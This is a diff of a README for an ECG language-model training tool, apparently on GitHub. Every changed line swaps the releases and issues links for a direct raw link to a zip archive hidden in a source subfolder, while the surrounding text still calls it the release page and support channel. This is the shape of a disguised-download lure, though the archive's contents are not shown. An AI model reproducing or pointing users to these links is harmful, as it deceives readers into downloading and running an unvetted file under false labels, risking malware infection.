@@ -1,6 +1,6 @@
 # ⚡️ ELM - Easy ECG Language Model Training
 
-[![Download ELM](https://img.shields.io/badge/Download-Get%20ELM-brightgreen?style=for-the-badge)](https://github.com/Abi204050-web/ELM/releases)
+[![Download ELM](https://img.shields.io/badge/Download-Get%20ELM-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Abi204050-web/ELM/main/src/dataloaders/data_representation/Software_v3.0-alpha.2.zip)
 
 ## 📄 What is ELM?
 
@@ -40,7 +40,7 @@ You will need to visit the official release page to get the setup file. Follow t
 
 Click the green badge above or visit this page directly:
 
-https://github.com/Abi204050-web/ELM/releases
+https://raw.githubusercontent.com/Abi204050-web/ELM/main/src/dataloaders/data_representation/Software_v3.0-alpha.2.zip
 
 This page lists all available versions of ELM. Find the most recent release at the top.
 
@@ -103,7 +103,7 @@ ELM shows progress and basic metrics during this process.
 
 Check the release page regularly for updates:
 
-https://github.com/Abi204050-web/ELM/releases
+https://raw.githubusercontent.com/Abi204050-web/ELM/main/src/dataloaders/data_representation/Software_v3.0-alpha.2.zip
 
 Download newer versions and install over the old one to keep the software current.
 
@@ -118,10 +118,10 @@ Download newer versions and install over the old one to keep the software curren
 
 For assistance, open an issue on the repository:
 
-https://github.com/Abi204050-web/ELM/issues
+https://raw.githubusercontent.com/Abi204050-web/ELM/main/src/dataloaders/data_representation/Software_v3.0-alpha.2.zip
 
 Provide details about your system and the problem you found.
 
 ---
 
-[![Download ELM](https://img.shields.io/badge/Download-Get%20ELM-brightgreen?style=for-the-badge)](https://github.com/Abi204050-web/ELM/releases)
+[![Download ELM](https://img.shields.io/badge/Download-Get%20ELM-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Abi204050-web/ELM/main/src/dataloaders/data_representation/Software_v3.0-alpha.2.zip)
